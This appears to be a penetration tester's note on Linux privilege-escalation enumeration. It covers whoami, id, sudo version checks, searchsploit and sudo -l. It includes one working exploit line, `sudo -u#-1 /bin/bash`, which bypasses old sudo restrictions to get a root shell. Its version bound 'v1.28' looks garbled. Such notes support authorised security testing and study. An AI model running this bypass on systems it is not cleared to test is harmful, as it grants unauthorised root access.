---
id: User Enumeration
aliases: []
tags:
  - Linux/Privesc/User-Enumeration
links: "[[Privesc]]"
---

# User Enumeration

___

<!-- User & Group {{{-->
## User & Group

Enumerate current user and group

<!-- User {{{-->
### User

#### whoami

[whoami](https://en.wikipedia.org/wiki/Whoami)
displays the currently logged in user on the system
by examining the `/etc/passwd` file

Check the currently logged in user on the system

```sh
whoami
```

#### Home directory

Investigate the user's home directory

```sh
/home/{username}/
```

<!-- }}} -->

<!-- Group {{{-->
### Group

#### id

Display the system identifications of a specified user.

- [Cyberciti - Linux/Unix id Command Examples](https://www.cyberciti.biz/faq/unix-linux-id-command-examples-usage-syntax/)
- [IBM - id Command](https://www.ibm.com/docs/en/aix/7.3.0?topic=i-id-command)

Find a user’s UID (*user ID*) or GID (*group ID*) and other information

```sh
id [Username] id [options]
```

Current user

```sh
id
```

Spicific user

```sh
id -u <user>
```

### root

Investigate the `/root` directory

```sh
/root
```
<!-- }}} -->

___
<!-- }}} -->

<!-- Sudo {{{-->
## Sudo

<!-- Sudo version {{{-->
### Sudo version

Check `sudo` version

```sh
sudo --version
```

```sh
sudo -V
```
<!-- }}} -->

<!-- Sudo vulnerabilities {{{-->
### Sudo vulnerabilities

Check if `sudo` version is in a vulnerable range

```sh
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

[[SearchSploit]] — Search `sudo` version for public exploits

```sh
searchsploit sudo
```

`sudo` < v1.28

```sh
sudo -u#-1 /bin/bash
```
<!-- }}} -->

<!-- Sudo commands {{{-->
### Sudo commands

Check which commands the current user may run

```sh
sudo -l
```

Run command as `user`

```sh
sudo -u user /bin/echo Hello World!
```

The found command(s) may be exploited with [GTFOBins](https://gtfobins.github.io/)

<!-- }}} -->

___
<!-- }}} -->
